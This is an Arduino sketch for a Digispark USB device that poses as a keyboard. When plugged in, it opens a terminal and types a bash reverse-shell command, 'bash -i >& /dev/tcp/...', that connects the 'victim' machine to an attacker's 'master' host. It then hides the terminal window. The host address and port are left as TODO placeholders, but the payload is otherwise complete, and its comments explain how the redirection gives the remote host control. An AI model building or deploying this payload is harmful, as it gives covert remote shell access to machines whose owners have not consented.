/**
 * @file BashReverseShell.ino
 * @brief This payload opens a terminal window and starts a remote shell
 * 
 * @copyright Copyright (c) Noé Ruano 2024
 * 
 */

#define LAYOUT_SPANISH	/* Change to whichever layout you need (LAYOUT_{US_ENGLISH, NORWEGIAN, ITALIAN, etc.}) */

#define MASTER_ADDRESS ""	// TODO
#define MASTER_PORT 1		// TODO
#define DELAY 1000		// TODO

#include <DigiKeyboard.h>

void setup() { }

void loop()
{
	// A first delay so that we don't miss the first keyboard stroke
	DigiKeyboard.delay(500);

	// Open a terminal window
	DigiKeyboard.sendKeyStroke(KEY_T, MODIFIERKEY_LEFT_CTRL | MODIFIERKEY_LEFT_ALT);
	DigiKeyboard.delay(300);

	// Start a remote shell connecting to a known port in the master host
	/*
	 * bash -i >& /dev/tcp/<IP>/<PORT> ...	-->	redirect the victim's standard output (1) and error
	 * 						output (2) via a socket whose IP and PORT are the
	 *						ones enabled in the master host
	 * ... /dev/tcp/<IP>/<PORT>	0>&1	-->	redirect the socket's standard input (what is being
	 *						written in the master host) to the victims standard
	 *						output
	 */
	DigiKeyboard.printf("bash -i >& /dev/tcp/%s/%d 0>&1", MASTER_ADDRESS, MASTER_PORT);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);

	// Hide terminal window
	DigiKeyboard.sendKeyStroke(KEY_H, MODIFIERKEY_LEFT_GUI);

	for (;;) { }
}

